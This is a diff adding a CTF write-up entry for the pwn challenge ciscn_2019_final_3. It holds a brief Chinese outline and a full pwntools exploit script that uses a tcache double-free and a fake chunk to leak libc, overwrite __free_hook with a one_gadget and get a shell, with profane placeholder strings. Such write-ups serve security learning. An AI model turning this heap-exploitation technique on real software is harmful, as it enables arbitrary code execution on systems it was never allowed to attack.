@@ -574,8 +574,71 @@ icon: icon-html
 
   
 
+* ### ciscn_2019_final_3
 
+  合并堆块得到unsorted bin，利用gift泄露libc
 
+  然后改free hook
 
+  ```python
+  from pwn import *
+  #r = remote('pwn.buuoj.cn',20232)
+  r = process('./ciscn_final_3')
+  elf = ELF('./ciscn_final_3')
+  libc = ELF('./libc.so.6')
+  
+  def add(index,size,sth):
+  	r.sendlineafter('choice >','1')
+  	r.sendlineafter('index',str(index))
+  	r.sendlineafter('size',str(size))
+  	r.sendlineafter('something',str(sth))
+  	r.recvuntil('gift :')
+  	gift = r.recvuntil('\n',drop = True)
+  	log.info(str(index)+':'+gift)
+  	return int(gift,16)
+  
+  def remove(index):
+  	r.sendlineafter('choice >','2')
+  	r.sendlineafter('index',str(index))
+  
+  
+  fuck_addr1 = add(0,0x78,'fuck')
+  add(1,0,'')
+  add(2,0x78,'fuck')
+  add(3,0x78,'fuck')
+  add(4,0x78,'fuck')
+  add(5,0x78,'fuck')
+  add(6,0x78,'fuck')
+  add(7,0x78,'fuck')
+  add(8,0x78,'fuck')
+  add(9,0x78,'fuck')
+  add(10,0x78,'fuck')
+  remove(10)
+  remove(10)
+  add(11,0x78,p64(fuck_addr1-0x10))
+  add(12,0x78,p64(fuck_addr1-0x10))
+  add(13,0x78,p64(0)+p64(0x4a1))
+  remove(0)
+  remove(1)
+  
+  add(14,0x78,'fuck')
+  add(15,0,'')
+  main_arena_96 = add(16,0,'')
+  libc_base = main_arena_96 - 0x3ebca0
+  free_hook = libc_base + libc.symbols['__free_hook']
+  one = libc_base + 0x4f322
+  log.success('free_hook:'+hex(free_hook))
+  log.success('one:'+hex(one))
+  add(17,0x60,'nmsl')
+  remove(17)
+  remove(17)
+  add(18,0x60,p64(free_hook))
+  add(19,0x60,p64(free_hook))
+  add(20,0x60,p64(one))
+  remove(0)
+  r.interactive()
+  ```
+
+  
 
 
